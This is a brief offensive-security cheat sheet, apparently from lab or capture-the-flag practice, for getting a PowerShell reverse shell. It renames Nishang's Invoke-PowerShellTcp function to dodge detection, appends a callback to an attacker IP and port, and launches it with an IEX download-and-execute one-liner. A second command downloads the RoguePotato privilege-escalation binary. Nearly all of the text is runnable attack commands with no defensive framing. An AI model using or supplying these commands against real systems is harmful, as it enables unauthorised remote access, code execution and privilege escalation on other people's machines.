# Powershell

powershell reverse shell

```text
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1

#edit this file to have the required reverse shell at the end
#and change the Invoke-PowerShellTcp to nopnopnop

:%s/Invoke-PowerShellTcp/nop/g
^^ in vim

nop -Reverse -IPAddress 10.10.14.28 -Port 4243
this line at the end of shell.ps1

# this is what gets us the reverse shell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:81/shell.ps1')"
```

smbserver or powershell download file

```text
invoke-webrequest -uri 'http://10.10.14.28/RoguePotato.exe' -outfile .\rp.exe
```



